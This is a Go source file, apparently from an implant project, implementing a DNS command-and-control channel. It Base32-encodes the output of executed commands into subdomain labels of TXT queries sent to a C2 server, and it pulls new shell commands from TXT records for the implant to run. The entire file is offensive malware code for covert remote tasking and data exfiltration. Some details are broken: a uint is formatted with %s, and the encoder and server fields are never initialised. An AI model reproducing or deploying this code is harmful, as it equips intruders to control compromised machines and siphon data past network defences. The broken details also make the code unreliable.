package c2communicator

import (
	"asritha.dev/implant/pkg/task"
	"encoding/base32"
	"fmt"
	"github.com/miekg/dns"
	"log"
	"strconv"
	"strings"
	"time"
)

const (
	maxLabelLen    = 63 // maximum length in bytes of a DNS label (RFC 1035 §2.3.4)
	defaultTimeout = 5 * time.Second
	throttleDelay  = 50 * time.Millisecond
)

// DNSC2Communicator implements a simple DNS-based C2 channel.
// It sends results in subdomains and receives new commands to execute via TXT records.
// NOTE: Only the "ShellCommand" task type is currently supported.
type DNSC2Communicator struct {
	client      *dns.Client
	b32Encoding *base32.Encoding
	domain      string
	serverAddr  string // DNS server address ("ip:port")
}

// Beacon sends any pending results to the C2 server, then fetches new tasks.
// Returns a Queue w/ Tasks of "ShellCommand" type
func (d *DNSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.Queue, error) {

	// 1. Send results
	if err := d.SendResults(implantID, results); err != nil {
		return nil, fmt.Errorf("send results: %w", err)
	}

	// 2. Fetch new tasks
	tq := task.NewQueue()
	newCommandsWithArgs, err := d.GetRequestedCommands(implantID)
	if err != nil {
		return nil, fmt.Errorf("get commands: %w", err)
	}

	for id, commandWithArgs := range newCommandsWithArgs {
		tq.Enqueue(task.NewShellCommand(id, commandWithArgs))
	}

	return tq, nil
}

// SendResults encodes each Result into DNS question labels and sends them as TypeTXT requests.
// It Base32-encodes the result payload, splits it into label-sized chunks, and embeds those chunks in the QNAME labels using the format:
//
//	<implantID>.<taskID>.<chunkCount>.<chunkIndex>.<chunkData>.r.<domain>
func (d *DNSC2Communicator) SendResults(implantID uint, results []task.Result) error {
	for _, result := range results {
		payload := result.Content
		if !result.Success {
			payload = "[FAIL]" + payload // TODO: need this -> come back and check after figuring out how it handles failed command tasks
		}

		// Base32-encode result data (no padding)
		encoded := d.b32Encoding.EncodeToString([]byte(payload))

		// Split into DNS-safe label cunks
		chunks := splitIntoChunks(encoded, maxLabelLen)
		chunkCount := len(chunks)

		// Send each chunk as a separate TXT query
		for index, chunk := range chunks {
			qname := fmt.Sprintf(
				"%s.%02d.%02d.%02d.%s.r.%s",
				implantID,
				result.TaskID,
				chunkCount,
				index+1, // chunkIndex starts at 1
				chunk,
				d.domain,
			)
			fqdn := dns.Fqdn(qname)

			log.Printf("Sending result chunk %d/%d for task %d: %s", index+1, chunkCount, result.TaskID, fqdn)
			msg := new(dns.Msg)
			msg.SetQuestion(fqdn, dns.TypeTXT)

			if _, _, err := d.client.Exchange(msg, d.serverAddr); err != nil {
				return fmt.Errorf("exchange TXT for task %d chunk %d: %w", result.TaskID, index+1, err)
			}

			// avoid flooding the DNS server
			time.Sleep(throttleDelay)
		}
	}
	return nil
}

// GetRequestedCommands fetches all pending tasks in one DNS response.
// It does a UDP query, and if the response is truncated it retries over TCP.
// Each TXT RR must be "<id>:<base32_no_pad(command)>".
func (d *DNSC2Communicator) GetRequestedCommands(implantID uint) (map[uint][]string, error) {
	queries := fmt.Sprintf("%d.c.%s", implantID, d.domain)
	fqdn := dns.Fqdn(queries)

	msg := new(dns.Msg)
	msg.SetQuestion(fqdn, dns.TypeTXT)
	msg.SetEdns0(4096, true) // allow larger UDP payloads

	// First try UDP
	d.client.Net = "udp"
	reply, _, err := d.client.Exchange(msg, d.serverAddr)
	if err != nil {
		return nil, fmt.Errorf("UDP exchange: %w", err)
	}

	// If truncated, retry via TCP
	if reply.Truncated { // TODO: make sure that if it does be truncated and  does the query again, it will get the exact same tasks to execute - or does SERVER make them "done" immediately
		d.client.Net = "tcp"
		reply, _, err = d.client.Exchange(msg, d.serverAddr)
		if err != nil {
			return nil, fmt.Errorf("TCP exchange: %w", err)
		}
	}

	commands := make(map[uint][]string)
	for _, rr := range reply.Answer {
		// Assert record type is TXT
		txt, ok := rr.(*dns.TXT)
		if !ok || len(txt.Txt) == 0 {
			continue // skip non-TXT or empty records
		}

		// Reassemble TXT fragments into a single Base32 string
		raw := strings.Join(txt.Txt, "")
		// Decode Base32 to original payload
		data, err := d.b32Encoding.DecodeString(raw)
		if err != nil {
			return nil, fmt.Errorf("decode TXT record: %w", err)
		}

		// Expect payload in format "<taskID>:<base32-cmd>"
		parts := strings.SplitN(string(data), ":", 2)
		if len(parts) != 2 {
			log.Printf("invalid TXT format %q, skipping", string(data))
			continue
		}

		// Parse task ID from string
		taskID, err := strconv.ParseUint(parts[0], 10, 32)
		if err != nil {
			log.Printf("invalid task ID %q: %v", parts[0], err)
			continue
		}

		// Split command string into arguments
		commandWithArgs := strings.Fields(parts[1])
		// Associate parsed command arguments with task ID
		commands[uint(taskID)] = commandWithArgs
	}
	return commands, nil
}

func NewDNSC2Communicator() *DNSC2Communicator {
	return &DNSC2Communicator{
		client: &dns.Client{},
	}
}

// splitIntoChunks splits s into substrings of up to size n.
func splitIntoChunks(s string, n int) []string {
	var chunks []string
	for i := 0; i < len(s); i += n {
		end := i + n
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}
